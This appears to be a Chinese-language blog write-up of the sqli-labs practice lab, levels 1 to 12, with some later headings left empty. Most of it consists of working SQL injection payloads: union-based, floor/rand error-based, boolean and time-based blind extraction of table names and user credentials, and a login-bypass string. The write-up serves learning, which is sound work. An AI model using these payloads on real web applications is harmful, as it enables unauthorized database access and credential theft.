---
layout:    post
title:     sqli-labs
subtitle:  学习学习
date:      2020-10-23
author:    lll-yz
header-img: img/post-bg-coffee.jpg
catalog:    true
tage:
    - 学习
---

####  一、SQL注入类型判断（前提了解）

        数字型注入
        字符型注入

1.数字型：输入 id=1 and 1=1 和 1=2进行判断，首先在URL中输入？id=1 and 1=1 页面显示正常，后输入id=1 and 1=2 页面出错，说明注入类型为数字型。<br>

原因如下：当输入 and 1=1时，后台执行sql语句：<br>

select*from <> where id = 1 and 1=1;<br>

没有语法错误且逻辑判断正确，返回正常。<br>

当输入 and 1=2时，后台执行sql语句：<br>

select*from <> where id = 1 and 1=2;<br>

没有语法错误，但逻辑判断为假，所以返回错误。<br>

若为字符型输入上述语句，后台执行sql语句：<br>

select*from <> where id ='1 and 1=1';<br>

select*from <> where id = '1 and 1=2';<br>

查询语句将and语句全部转换为字符串，不会进行逻辑判断，所以不会显示错误。<br>

2.字符型：输入 and '1'='1 和 and '1'='2来判断. 。当输入and '1'='1时页面正常，输入 and '1'='2后错误，说明注入类型为字符型。<br>

原因如下：当输入 and '1'='1时，sql语句为：<br>

select*from <> where id = 'x' and '1'='1'; <br>

没有语法错误且逻辑判断正确，返回正常。<br>

当输入 and '1'='2时，sql语句为：<br>

select*from <> where id = 'x' and '1'='2'; <br>

没有语法错误，但逻辑判断为假，所以返回错误。<br>

#### Less-1

​    1.使用hackbar,首先输入id= 1,显示正常，接着输入id=1 and 1=2判断是否为数字型注入，发现不是。

​    2.输入id=1' 显示错误，说明为字符型注入。

​    3.用--+注释掉后面的’，输入id=1' order by x --+ （x=1,2,3,4）,判断字段，发现有3个字段。

​	4.id=-1' union select 1,2,3 --+，判断回显（要让系统使用联合查询，要使前面id错误（如id=-1等错误id）来进行后面的查询语句）。回显位为2，3位。

​	5.id=-1' union select 1,database(),3 --+,查询数据库名称。

​	6.id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 --+,得到表名。

​	7.id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3 --+,得到列名。

​	8.id=-1' union select 1,(select group_concat(username,password) from security.users),3 --+,成功。

#### Less-2

​	1.判断注入，输入id=1 and 1=2，报错，数字型注入。

​	2.步骤同Less-1。

#### Less-3

​	1.判断注入，发现是基于 ') 的字符注入。id=1') --+。

​	2.步骤同Less-1。

#### Less-4

​	1.判断注入，为基于 ") 的字符注入。 id=1") --+。

​	2.步骤同Less-1。

#### Less-5

##### 	基础知识:

   1.floor(): 去除小数部分。

2. rand ():产生随机数。
3. limit 0,1 表示输出第一个数据。0表示输出起始位置，1表示输出一个。
4. rand(x): 每个x对应一个固定的值，但是如果连续执行多次值会变化，不过也是可以预测的。
5. floor报错payload: and select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)
6. floor(rand(0)*2)x ,x 为 floor(rand(0)*2)的别名。
7. payload的重点在group by a，也就是group by floor(rand(0)2)。首先，floor(rand(0)2)的意思是随机产生0或1。虽说是随机，但是它是有规律可循的。rand(0)，虽说是随机数，但是它的值与执行rand(0)的次数是意义对应的，即每一次执行rand(0)得到的结果都是固定的。基本是011011…这个序列。
8. 具体解释来自：https://blog.csdn.net/qq_43504939/article/details/90046342?utm_medium=distribute.wap_relevant.none-task-blog-title-2

#####    注入:

	1. ?id=1正常  接着 ?id=1' --+发现可以。
 	2. ?id=1' order by x --+  ,判断字段列数。得到列数为：3。
 	3. ?id=1' union select 1,2,3 --+ ，无回显，采用报错注入。
 	4. ?id=1' and (select 1 from (select count(*),concat((payload),floor(rand(0)*2))x from information_schema.tables group by x)a) --+ ,payload为要输入的查询语句。注意：输出的字符长度限制为64个字符。
 	5. ?id=1' and (select 1 from (select count(*),concat(((select group_concat(schema_name) from information_schema.schemata)),floor(rand(0)*2))x from information_schema.tables group by x)a) --+ 提示信息超出一行。
 	6. ?id=1' and (select 1 from (select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a) --+  得到数据库名。
 	7. ?id=1' and (select 1 from (select count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema='security'),floor(rand(0)*2))x from information_schema.tables group by x)a) --+  报错显示不能超过一行。
 	8. ?id=1' and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+  用limit一个一个显示。 得到表名。
 	9. ?id=1' and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name='users' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+  得列名。
 	10. ?id=1' and (select 1 from (select count(*),concat((select username from security.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+ 逐个得出账号密码。

#### Less-6

   1.基于 " 的报错注入。

   2.将id=1' 改为id=2'  其余与Less-5相同。

#### Less-7

#### Less-8

#####   基础知识:

​	1.substr(a,b,c): 在a中从b位开始取c位。

​	2.ascii(a): 将a转化为ascii。

#####   注入:

   1.基于 ' 的布尔盲注。

   2.?id=1正常， ?id=1'错误无提示，?id=1' --+正常。

   3.?id=1' order by x--+ (x=1,2,3,4) 得到有三列字段。

   4.?id=-1' union select 1,2,3 --+ 无回显，采用布尔时间盲注。

   3.?id=1' and length(database())=8 ,判断数据库名的长度。

​	4.?id=1' and substr(database(),1,1)='s' --+ 判断数据库名，通过改变substr里位置来猜名。或 ?id=1' and ascii(substr(database(),1,1))=115 --+ 用ascii来猜测库名。

​	5.同理猜测出表名，列名，账号密码。

#### Less-9

#####   基础知识:

​	1.sleep(x): 执行后，睡眠x秒后执行。

​	2.if(a,b,c): 如果a正确，b执行否则c执行。

#####   注入:

​	1.基于 ’ 的时间盲注。

​	2.?id=1 ,?id=1' 发现不论对错不会产生变化，采用时间盲注。

​	3.?id=1 and sleep(5) --+ ,?id=1' and sleep(5) --+ 判断闭合。

​	4.?id=1' and if(length(database())=8,1,sleep(5)) --+ ，判断数据库名长度。

​	5.?id=1' and if(substr(database(),1,1)='s',1,sleep(5)) --+ ,判断数据库名。或 ?id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(5)) --+ ，判断数据库名。通过改变substr的步长来逐步猜测。

​	6.?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101,1,sleep(5)) --+ ,判断表名。改变limit，substr步数逐步判断。

​	7.同理得到列名，账号密码。

#### Less-10

​	1.基于 " 的时间盲注。

​	2.?id=1" 其余与Less-9相同。

#### Less-11

#####   前言：

  1.进入post的世界。

  2.采用万能密码可以直接登陆。 为：admin' or '1'='1'。

  3.我这里使用的是hackbar进行的post注入，burp抓包也可以。注意：注释不能用--+会出错，要采用#代替。

#####    注入：

​	1.基于 ' 的post注入。

​	2.查看源码发现账户名为: uname,密码名为: passwd,提交为: submit=Submit。

​	3.采用post注入，uname=admin&passwd=admin&submit=Submit ,回显成功。

​	4.判断注入类型，uname=admin' #&passwd=admin&submit=Submit 正确。

​	5.uname=admin' order by x #&passwd=admin&submit=Submit (x=1,2,3) ,得到字段为2。

​	6.uname=-admin' union select 1,2 #&passwd=admin&submit=Submit ,判断回显。

​	7.uname=admin' union select 1,database() #&passwd=admin&submit=Submit ，查找数据库名。

​	8.uname=admin' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security' #&passwd=admin&submit=Submit  ,查找表名。

​	9.uname=admin' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #&passwd=admin&submit=Submit ,查找列名。

​	10.uname=admin' union select 1,username from security.users limit 0,1 #&passwd=admin&submit=Submit ,因为有行数限制，用limit逐个查询。

#### Less-12

​	1..基于 ") 的post注入。

​	2.将uname=admin' 改为 uname=admin") 即可，其余与Less-11相同。

#### Less-13

#### Less-14

#### Less-15

#### Less-16

